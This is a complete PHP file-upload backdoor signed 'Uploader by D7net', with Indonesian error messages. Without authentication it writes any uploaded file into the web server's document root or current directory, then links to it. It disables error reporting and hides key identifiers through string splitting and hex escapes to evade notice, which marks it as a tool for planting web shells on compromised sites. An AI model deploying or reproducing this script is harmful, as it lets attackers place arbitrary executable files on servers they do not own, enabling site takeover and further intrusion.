<?php
$aut = "\x55\x70"."\x6c\x6fa"."\x64\x65\x72 "."\x62\x79 "."\x64\x37"."\x6e\x65\x74";
echo "<br>$aut<br><br><form method='post' enctype='multipart/form-data'>
      <input type='file' name='d7net'>
      <input type='submit' name='upload' value='upload'>
      </form>";
      error_reporting(0);
      error_log(0);
$opets = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
$pile = $_FILES['d7net']['name'];
$d7net = $_FILES['d7net']['tm'.'p_na'.'me'];
$opet1 = $opets.'/'.$pile;
$fat = "pa"."th";
$rats = "r"."oo"."t";
$pn = "Fil"."en"."ame";
$gc = "\x67\x65"."\x74\x63"."\x77\x64";
if(isset($_POST['upload'])) {
    if(is_writable($opets)) {
        if(@copy($d7net, $opet1)) {
            $webz = $_SERVER['HT'.'TP'.'_H'.'OST'];
            $opet = (isset($_SERVER['HT'.'TP'.'S']) && $_SERVER['H'.'TT'.'PS'] === 'on' ? "ht"."tps" : "ht"."tp")."://".$webz."/"; /** Uploader by D7net **/
            echo "<font color='black'>Uploaded : $opet$pile => 
            <a href='$opet$pile' target='_blank'><font color='darkslateblue'>Click here</font></a>";
        } else {
            echo "<font color='red'><b>gagal upload di document $rats.</b></font>";
        }
    } else {
        $web = $gc();
        if(@copy($d7net, $pile)) {
            echo "<br>$fat : <font color='darkslateblue'><b>$web</b></font><br />
            <font color='black'>$pn : <b><font color='darkslateblue'>$pile</b>";
        } else {
            echo "<font color='red'>gagal upload</font>";
        }
    }
}
?>
